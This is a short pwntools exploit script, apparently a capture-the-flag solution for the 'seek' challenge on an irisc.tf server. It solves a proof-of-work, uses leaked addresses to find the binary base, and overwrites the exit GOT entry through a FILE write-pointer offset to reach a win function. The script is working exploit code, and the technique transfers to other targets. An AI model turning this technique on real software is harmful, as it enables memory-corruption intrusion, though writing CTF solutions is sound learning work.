#!/usr/bin/python3

from pwn import *
import subprocess

def poc(solve: bytes):
    r = process(["./poc.py","solve", solve])
    r.recvuntil("Solution: \n")
    x = r.recvline().strip(b"\n")
    print("SOLUTION = ", x)
    r.close()
    return x


#p = process("./chal")
p = remote("seek.chal.irisc.tf", 10004)
elf = ELF("./chal", checksec = 0)

p.recvuntil(b"kctf-pow) solve ")
solve = p.recvline().strip(b"\n")
print("TO-SOLVE = ", solve)
solution = poc(solve)
p.sendlineafter(b"Solution? ", solution)

p.recvuntil(b"around ")

elf.address = int(p.recvline().strip(b".\n"), 16) - elf.sym.win

p.recvuntil(b"at ")

_IO_write_ptr = int(p.recvline().strip(b".\n"), 16)
exit_got = elf.got.exit

p.sendlineafter(b"into? ", str(-(_IO_write_ptr - exit_got)))

p.interactive()
